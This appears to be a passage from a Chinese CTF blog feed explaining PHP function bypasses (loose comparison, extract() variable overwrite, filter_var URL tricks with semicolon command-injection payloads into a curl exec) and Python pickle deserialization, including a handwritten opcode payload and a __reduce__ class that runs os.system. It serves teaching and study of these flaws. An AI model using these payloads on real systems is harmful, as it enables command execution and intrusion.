<h1 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h1><p>用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。<br>当检索中带入字符串，比如”sky”，会intval(‘sky’)==0，从而致使数字数组也可以查询成功</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------- array_search()黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$array_search</span>=[<span class="number">1</span>,<span class="number">0</span>];</span><br><span class="line"><span class="variable">$eee</span> = @array_search(<span class="string">&quot;XMAN&quot;</span>, <span class="variable">$array_search</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$eee</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;array_search()检索字符串绕过成功&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode()"></a>json_decode()</h1><p>这个漏洞迷一样……我也是偶然发现，只能自己从下面的样例代码中领悟了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------- json_decode()黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$v3</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;&#123;&quot;key&quot;:0001&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=json_decode(@<span class="variable">$input</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$var</span> = <span class="variable">$b</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">        (<span class="variable">$var</span> === <span class="literal">true</span>)?<span class="variable">$v3</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$v3</span>) &#123;</span><br><span class="line">        	<span class="keyword">echo</span> <span class="string">&quot;json_decode()函数漏洞绕过成功&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="Extract（）"><a href="#Extract（）" class="headerlink" title="Extract（）"></a>Extract（）</h1><p><em>该函数使用数组键名作为变量名，使用数组键值作为变量值。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖漏洞。</em></p>
<p>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;    <span class="comment">//原变量值为1</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">extract(<span class="variable">$b</span>);    <span class="comment">//经过extract()函数对$b处理后</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;    <span class="comment">//输出结果为3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">&quot;extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$a</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span>=<span class="built_in">trim</span>(file_get_contents(<span class="variable">$flag</span>));<span class="comment">//file_get_contents—将整个文件读入一个字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="variable">$content</span>)                             <span class="comment">//trim—去除字符串首尾处的空白字符（或者其他字符）</span></span><br><span class="line">&#123; echo&#x27;flag&#123;**********&#125;&#x27;; &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; echo&#x27;这不是flag啊&#x27;; &#125;</span><br><span class="line">&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>题目使用了<strong>extract($_GET)**接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用</strong>extract()**对变量进行覆盖，从而满足各个条件。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">?a=<span class="meta">&amp;content=</span></span><br><span class="line">或者可以利用file_get_contents（）可以读取只读流：php:<span class="comment">//input构造Payload</span></span><br></pre></td></tr></table></figure>


<h1 id="in-array-绕过（适用不设第三个参数的情况）"><a href="#in-array-绕过（适用不设第三个参数的情况）" class="headerlink" title="in_array()绕过（适用不设第三个参数的情况）"></a>in_array()绕过（适用不设第三个参数的情况）</h1><blockquote>
<p>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )<br>说明：在 haystack 中搜索 needle，如果没有设置 strict 则使用 宽松 的比较。如果第三个参数 strict 的值为 true，则 in_array 函数还会检查 needle 的 类型 是否和 haystack 中的相同。</p>
</blockquote>
<p>in_array 函数存在第三个参数 strict，它用来标记函数在对两元素进行比较时是否采用 严格比较，类似 == 和 === 区别，in_array 函数默认采用 宽松 比较，即不比较类型，只比较值是否相等。<br>例如：<code>in_array(0, array(&#39;s&#39;))</code>会返回 TRUE,这是因为因为 in_array 函数没有使用第三个参数，而默认进行了 宽松 比较，即等同于 0 == ‘s’ ，而为什么0 == ‘s’，可参照下表:</p>
<p><img src="https://img.npfs06.top/20210305101134.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>参照第四点，当两不同类型数值中含有数字类型，都会转化为数字类型进行比较。那么s转化为数字类型为0，所以0 == 0 ？判断为 true。</p>
<h1 id="filter-var-（仅对FILTER-VALIDATE-URL）"><a href="#filter-var-（仅对FILTER-VALIDATE-URL）" class="headerlink" title="filter_var()  （仅对FILTER_VALIDATE_URL）"></a>filter_var()  （仅对FILTER_VALIDATE_URL）</h1><blockquote>
<p>filter_var() 要求传入参数符合url规定，函数通过指定的过滤器过滤一个变量。 如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。<br>FILTER_VALIDATE_URL：把值作为 URL 来验证。</p>
</blockquote>
<p>该函数的具体使用方法可参考<a href="http://www.findme.wang/blog/detail/id/473.html">http://www.findme.wang/blog/detail/id/473.html</a></p>
<p>FILTER_VALIDATE_URL 过滤器来判断是否是一个合法的url。</p>
<h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>) &amp;&amp; filter_var(<span class="variable">$url</span>, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$site_info</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        exec(<span class="string">&#x27;curl &quot;&#x27;</span>.<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造符合函数要求的URL即可，又因为题目正则匹配了要求以sec-redclub.com结尾，构造如下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?url=<span class="number">0</span>:<span class="regexp">//</span>xxx.com;sec-redclub.com  </span><br><span class="line">?url=http:<span class="regexp">//</span>xxx.com()sec-redclub.com</span><br><span class="line">()里换成@&amp;?/,:<span class="comment">#这些任意一个均可</span></span><br></pre></td></tr></table></figure>


<h1 id="htmlentities"><a href="#htmlentities" class="headerlink" title=".htmlentities()"></a>.htmlentities()</h1><p>在写PHP代码时，不能在字符串中直接写实体字符，因此需要一个将HTML特殊字符转换成实体字符的函数 htmlentities()。<br>注：htmlentities() 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：</p>
<ul>
<li>ENT_COMPAT（默认值）：只转换双引号。</li>
<li>ENT_QUOTES：两种引号都转换。</li>
<li>ENT_NOQUOTES：两种引号都不转换。</li>
</ul>
<p><img src="https://img.npfs06.top/20210305101332.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>参考 <a href="https://skysec.top/2017/07/22/PHP%E5%87%BD%E6%95%B0%E9%BB%91%E9%AD%94%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank">PHP函数黑魔法小总结/ </a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>python反序列化漏洞</title>
    <url>/2021/04/29/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>好久没做到过python反序列化的题目了，忘得差不多了。刚好在前几天的<code>[HFCTF 2021 Final]easyflask</code>遇到了python反序列化的相关考点，重新学习了一遍相关知识，特此记录<a id="more"></a></p>
<h1 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h1><p>pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为<code>.pkl</code>），不能直接打开进行预览。</p>
<h2 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h2><ul>
<li>从对象中提取所有属性（__dict__），并将属性转为键值对</li>
<li>写入对象的类名</li>
<li>写入键值对</li>
</ul>
<h2 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h2><ul>
<li>获取 pickle 输入流</li>
<li>重建属性列表</li>
<li>根据保存的类名创建一个新的对象</li>
<li>将属性复制到新的对象中</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">dumps</td>
<td align="center">对象反序列化为bytes对象</td>
</tr>
<tr>
<td align="center">dump</td>
<td align="center">对象反序列化到文件对象，存入文件</td>
</tr>
<tr>
<td align="center">loads</td>
<td align="center">从bytes对象反序列化</td>
</tr>
<tr>
<td align="center">load</td>
<td align="center">对象反序列化，从文件中读取数据</td>
</tr>
</tbody></table>
<p>下面，我们举一个例子来说明其工作方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//python3</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name = <span class="string">&#x27;npfs&#x27;</span></span><br><span class="line">        self.date = <span class="number">123456</span></span><br><span class="line"></span><br><span class="line">flag = name()</span><br><span class="line">a = pickle.dumps(flag)</span><br><span class="line">print(a)</span><br><span class="line">b = pickle.loads(a)</span><br><span class="line">print(b.name)</span><br></pre></td></tr></table></figure>
<p>输出结果为:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">b&#x27;\<span class="keyword">x</span><span class="number">80</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">952</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">8</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">08</span>__main__\<span class="keyword">x</span><span class="number">94</span>\<span class="keyword">x</span><span class="number">8</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">04</span>name\<span class="keyword">x</span><span class="number">94</span>\<span class="keyword">x</span><span class="number">93</span>\<span class="keyword">x</span><span class="number">94</span>)\<span class="keyword">x</span><span class="number">81</span>\<span class="keyword">x</span><span class="number">94</span>&#125;\<span class="keyword">x</span><span class="number">94</span>(h\<span class="keyword">x</span><span class="number">01</span>\<span class="keyword">x</span><span class="number">8</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">04</span>npfs\<span class="keyword">x</span><span class="number">94</span>\<span class="keyword">x</span><span class="number">8</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">04</span>date\<span class="keyword">x</span><span class="number">94</span>J@\xe<span class="number">2</span>\<span class="keyword">x</span><span class="number">01</span>\<span class="keyword">x</span><span class="number">00</span>ub.&#x27;</span><br><span class="line">npfs</span><br></pre></td></tr></table></figure>
<p>可以看到，我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法.<br>我们需要注意以下两点:</p>
<p> <strong>1.</strong>  如果我在反序列化以前删除了name()这个类，那么我们在反序列化的过程中因为对象在当前的运行环境中没有找到这个类就会报错，从而反序列化失败。<br> <strong>2.</strong>  对于我们自己定义的class，如果直接以形如下面这种形式:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">name</span>():</span><br><span class="line">    <span class="symbol">name</span> = &#x27;<span class="symbol">npfs</span>&#x27;</span><br><span class="line">    <span class="symbol">date</span> = <span class="symbol">123456</span></span><br></pre></td></tr></table></figure>
<p>那么序列化时这两个数据将不会被打包,只有以上面第一个例子中一样写一个__init__方法才能被进行打包.</p>
<h1 id="反序列化的底层实现"><a href="#反序列化的底层实现" class="headerlink" title="反序列化的底层实现"></a>反序列化的底层实现</h1><h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p>这里简单了解一下就可以了</p>
<p>PVM(Python 虚拟机)是实现Pickle反序列化最本质的东西。在反序列化的过程中，我们可以把它理解成字符串经过PVM处理后，被转化成一个对象的过程。 而字符串本身就是一串PVM指令。 Pickle实际上是一门栈语言，他有不同的几种编写方式，pickle构造出的字符串，有很多个版本。在pickle.loads时，可以用Protocol参数指定协议版本，例如指定为0号版本：</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">class <span class="built_in">name</span>():</span><br><span class="line">    def <span class="variable">__init__</span>(self):</span><br><span class="line">        self.<span class="built_in">date</span> = <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">flag</span> = <span class="built_in">name</span>()</span><br><span class="line">a = pickle.dumps(<span class="built_in">flag</span>,protocol=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<p>PVM 由三部分组成：</p>
<ul>
<li><p>指令处理器</p>
<p>从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。</p>
<p>最终留在栈顶的值将被作为反序列化对象返回。</p>
</li>
<li><p>stack</p>
<p>由 Python 的 list 实现，被用来临时存储数据、参数以及对象。</p>
</li>
<li><p>memo</p>
<p>由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</p>
</li>
</ul>
<p>PS：注意下 stack、memo 的实现方式，方便理解下面的指令。</p>
<blockquote>
<p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p>
<ul>
<li>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li>
<li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li>
<li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307">PEP 307</a>。</li>
<li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes">bytes</a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li>
<li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154">PEP 3154</a>。</li>
</ul>
</blockquote>
<h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><blockquote>
<p>本文重点说明 0 号协议，不明白的指令建议直接看对应实现！</p>
</blockquote>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">MARK</span>           = b<span class="string">&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line"><span class="attr">STOP</span>           = b<span class="string">&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line"><span class="attr">POP</span>            = b<span class="string">&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line"><span class="attr">POP_MARK</span>       = b<span class="string">&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line"><span class="attr">DUP</span>            = b<span class="string">&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line"><span class="attr">FLOAT</span>          = b<span class="string">&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line"><span class="attr">INT</span>            = b<span class="string">&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line"><span class="attr">BININT</span>         = b<span class="string">&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line"><span class="attr">BININT1</span>        = b<span class="string">&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line"><span class="attr">LONG</span>           = b<span class="string">&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line"><span class="attr">BININT2</span>        = b<span class="string">&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line"><span class="attr">NONE</span>           = b<span class="string">&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line"><span class="attr">PERSID</span>         = b<span class="string">&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line"><span class="attr">BINPERSID</span>      = b<span class="string">&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line"><span class="attr">REDUCE</span>         = b<span class="string">&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line"><span class="attr">STRING</span>         = b<span class="string">&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line"><span class="attr">BINSTRING</span>      = b<span class="string">&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line"><span class="attr">SHORT_BINSTRING</span>= b<span class="string">&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"><span class="attr">UNICODE</span>        = b<span class="string">&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line"><span class="attr">BINUNICODE</span>     = b<span class="string">&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line"><span class="attr">APPEND</span>         = b<span class="string">&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line"><span class="attr">BUILD</span>          = b<span class="string">&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"><span class="attr">GLOBAL</span>         = b<span class="string">&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line"><span class="attr">DICT</span>           = b<span class="string">&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line"><span class="attr">EMPTY_DICT</span>     = b<span class="string">&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line"><span class="attr">APPENDS</span>        = b<span class="string">&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line"><span class="attr">GET</span>            = b<span class="string">&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line"><span class="attr">BINGET</span>         = b<span class="string">&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line"><span class="attr">INST</span>           = b<span class="string">&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line"><span class="attr">LONG_BINGET</span>    = b<span class="string">&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line"><span class="attr">LIST</span>           = b<span class="string">&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line"><span class="attr">EMPTY_LIST</span>     = b<span class="string">&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line"><span class="attr">OBJ</span>            = b<span class="string">&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line"><span class="attr">PUT</span>            = b<span class="string">&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line"><span class="attr">BINPUT</span>         = b<span class="string">&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line"><span class="attr">LONG_BINPUT</span>    = b<span class="string">&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line"><span class="attr">SETITEM</span>        = b<span class="string">&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line"><span class="attr">TUPLE</span>          = b<span class="string">&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line"><span class="attr">EMPTY_TUPLE</span>    = b<span class="string">&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line"><span class="attr">SETITEMS</span>       = b<span class="string">&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line"><span class="attr">BINFLOAT</span>       = b<span class="string">&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line"><span class="attr">TRUE</span>           = b<span class="string">&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"><span class="attr">FALSE</span>          = b<span class="string">&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure>
<p>这里有几个需要重点了解一下</p>
<p> <strong>c</strong> : 读取本行的内容作为模块名(module),读取下一行的内容作为对象名(object),然后将 module.object作为可调用对象压入到栈中。<br><strong>(</strong> : 将一个标记对象压入到栈中,用于确定命令执行的位置,该标记常常搭配t指令一起使用,以便产生一个元组。<br><strong>0</strong> ：弹出栈项的元素并丢弃。<br><strong>S</strong> : 后面跟字符串,PVM会读取引号中的内容,直到遇见换行符,然后将读取到的内容压入到栈中。(结果要有\n分隔)<br><strong>0</strong> ：弹出栈项的元素并丢弃<br><strong>t</strong> : 从栈中不断弹出数据,弹射顺序与压栈时相同,直到弹出左括号.此时弹出的内容形成了一个元组,然后,该元组会被压入栈中。<br><strong>R</strong> : 将之前压入栈中的元组和可调用对象全部弹出,然后将该元组作为可调用参数的对象并执行该对象,最后将结果压入到栈中。<br><strong>b</strong> : 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置<br><strong>.</strong>  : 结束整个Pickle反序列化过程。</p>
<h2 id="如何生成-pickle？"><a href="#如何生成-pickle？" class="headerlink" title="如何生成 pickle？"></a>如何生成 pickle？</h2><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>基本模式：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">c<span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">callable</span>&gt;</span></span><br><span class="line">(<span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">tR</span><br></pre></td></tr></table></figure>
<p>看个小例子：</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">cos</span><br><span class="line"><span class="keyword">system</span></span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span></span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line">&lt;=&gt; __import__(<span class="string">&#x27;os&#x27;</span>).<span class="keyword">system</span>(*(<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"># 分解一下：</span><br><span class="line">cos</span><br><span class="line"><span class="keyword">system</span>  =&gt;  引入 <span class="keyword">system</span>，并将函数添加到 stack</span><br><span class="line"></span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span>  =&gt;  把当前 stack 存到 metastack，清空 stack，再将 <span class="string">&#x27;ls&#x27;</span> 压入 stack</span><br><span class="line">t       =&gt;  stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack</span><br><span class="line"># 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [&lt;built-<span class="keyword">in</span> function <span class="keyword">system</span>&gt;, (<span class="string">&#x27;ls&#x27;</span>,)]</span><br><span class="line">R       =&gt;  <span class="keyword">system</span>(*(<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line">.       =&gt;  结束，返回当前栈顶元素</span><br></pre></td></tr></table></figure>


<h1 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a>__reduce__</h1><p> <code>__reduce__() </code>魔术方法类似于 PHP 对象中的 <code>__wakeup()</code> 方法，会在反序列化时自动调用<code>__reduce__() </code>魔术方法可以返回一个字符串或者时一个元组。简单说来,就是如果当<code>__reduce__</code>返回值为一个元组(2到5个参数),第一个参数是可调用(callable)的对象,第二个是该对象所需的参数元组.在这种情况下,反序列化时会自动执行__reduce__里面的操作.其中返回元组时，第一个参数为<code>一个可调用对象</code>，第二个参数为<code>该对象所需要的参数</code></p>
<p>例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rce</span>(<span class="params"><span class="built_in">object</span></span>):</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = Rce()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">pickle.loads(b)  <span class="comment"># 执行该语句进行反序列化，自动执行 __reduce__ 方法，并且执行 os.system(&#x27;ls&#x27;)</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>web源码泄露</title>
    <url>/2020/04/21/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<p>web中常见的源码泄露<a id="more"></a></p>
